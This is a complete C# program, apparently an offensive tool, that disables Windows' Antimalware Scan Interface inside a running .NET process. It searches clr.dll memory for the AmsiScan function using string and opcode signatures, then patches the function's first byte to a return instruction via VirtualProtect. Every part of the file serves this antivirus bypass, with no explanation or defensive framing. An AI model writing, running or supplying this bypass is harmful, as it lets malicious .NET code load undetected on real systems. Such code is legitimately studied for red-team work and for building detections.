using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ClrAmsiScanPatcher
{
    internal class Program
    {
        static byte[] Buffer;

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        static ProcessModule GetClrProcessModule()
        {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName == "clr.dll")
                {
                    return module;
                }
            }
            return null;
        }

        static void ReadProcessModuleToBuffer(ProcessModule clrModule)
        {
            Buffer = new byte[clrModule.ModuleMemorySize];
            Marshal.Copy(clrModule.BaseAddress, Buffer, 0, Buffer.Length);
        }

        static int FindDotNetStringOffset()
        {
            byte[] dotNetStringBytes = Encoding.Unicode.GetBytes("DotNet");

            for (int i = 0; i < Buffer.Length; i++)
            {
                bool success = true;
                for (int j = 0; j < dotNetStringBytes.Length; j++)
                {
                    if (Buffer[i + j] != dotNetStringBytes[j])
                    {
                        success = false;
                        break;
                    }
                }

                if (success)
                    return i;
            }

            return 0;
        }

        static int FindInstructionOffset(int dotNetStringOffset)
        {
            if (IntPtr.Size == 4)
            {
                byte[] pushInstruction = new byte[4] { 0x51, 0x68, 0x00, 0x00 };
                BitConverter.GetBytes(dotNetStringOffset).Take(2).ToArray().CopyTo(pushInstruction, 2);

                for (int i = dotNetStringOffset; i >= 0; i--)
                {
                    bool success = true;
                    for (int j = 0; j < 4; j++)
                    {
                        if (Buffer[i + j] != pushInstruction[j])
                        {
                            success = false;
                            break;
                        }
                    }
                    if (success) return i;
                }
            }
            else
            {
                for (int i = dotNetStringOffset; i >= 0; i--)
                {
                    byte[] leaInstruction = new byte[7] { 0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00 };
                    BitConverter.GetBytes(dotNetStringOffset - i - 7).CopyTo(leaInstruction, 3);

                    bool success = true;
                    for (int j = 0; j < 7; j++)
                    {
                        if (Buffer[i + j] != leaInstruction[j])
                        {
                            success = false;
                            break;
                        }
                    }
                    if (success) return i;
                }
            }

            return 0;
        }

        static int FindAmsiScanFunctionOffset(int instructionOffset)
        {
            byte[] functionStartBytes = IntPtr.Size == 4 ? new byte[] { 0xCC, 0x6A, 0x24 } : new byte[] { 0xCC, 0x48, 0x89 };

            for (int i = instructionOffset; i >= 0; i--)
            {
                if (Buffer[i - 1] == functionStartBytes[0] && Buffer[i] == functionStartBytes[1] && Buffer[i + 1] == functionStartBytes[2])
                    return i;
            }

            return 0;
        }

        static bool PatchAmsiScanFunction(IntPtr amsiScanFunctionAddress)
        {
            byte[] patchBytes = new byte[] { 0xC3 };

            uint oldProtect = 0;
            if (VirtualProtect(amsiScanFunctionAddress, (uint)patchBytes.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patchBytes, 0, amsiScanFunctionAddress, patchBytes.Length);
                VirtualProtect(amsiScanFunctionAddress, (uint)patchBytes.Length, oldProtect, out oldProtect);
                return true;
            }
            return false;
        }

        static void Main(string[] args)
        {
            ProcessModule clrModule = GetClrProcessModule();
            if (clrModule == null)
                return;
            Console.WriteLine("[+] Found 'clr.dll' process module");

            ReadProcessModuleToBuffer(clrModule);
            Console.WriteLine("[+] Read {0} bytes from 'clr.dll'\n", Buffer.Length);

            int dotNetStringOffset = FindDotNetStringOffset();
            if (dotNetStringOffset == 0)
                return;
            Console.WriteLine("[+] Found offset of 'DotNet' string:    " + dotNetStringOffset.ToString("X"));

            int instructionOffset = FindInstructionOffset(dotNetStringOffset);
            if (instructionOffset == 0)
                return;
            Console.WriteLine("[+] Found instruction offset:           " + instructionOffset.ToString("X"));

            int amsiScanFunctionOffset = FindAmsiScanFunctionOffset(instructionOffset);
            if (amsiScanFunctionOffset == 0)
                return;
            
            IntPtr amsiScanFunctionAddress = clrModule.BaseAddress + amsiScanFunctionOffset;
            Console.WriteLine("[+] Found AmsiScan function address:    " + amsiScanFunctionAddress.ToString("X") + "\n");

            if (PatchAmsiScanFunction(amsiScanFunctionAddress))
                Console.WriteLine("[+] Successfully patched AmsiScan");
        }
    }
}
